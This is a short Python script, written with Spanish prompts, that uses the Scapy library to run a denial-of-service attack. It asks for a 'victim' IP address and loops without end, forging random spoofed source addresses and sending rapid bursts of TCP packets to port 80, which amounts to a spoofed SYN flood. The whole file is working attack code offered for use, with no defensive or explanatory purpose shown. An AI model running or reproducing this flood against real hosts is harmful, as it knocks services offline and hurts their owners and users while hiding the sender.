#!/usr/bin/env python

from scapy.all import *

victima = raw_input('ingresa la ip de la victima: ')
p =1
while True:
  a=str(random.randint(1,254))
  b=str(random.randint(1,254))
  c=str(random.randint(1,254))
  d=str(random.randint(1,254))
  dot="."
  src=a+dot+b+dot+c+dot+d
  print src
  st= random.randint(1,1000)
  en= random.randint(1000,65535)
  loop_break=0
  for srcport in range (st,en):
   IP1 = IP(src=src, dst=victima)
   TCP1 = TCP(sport=srcport, dport=80)
   pkt = IP1 / TCP1
   send(pkt,inter= .0001)
   print 'paquete enviado: ', p
   loop_break=loop_break+p
   p=p+1
   if loop_break == 50:
     break
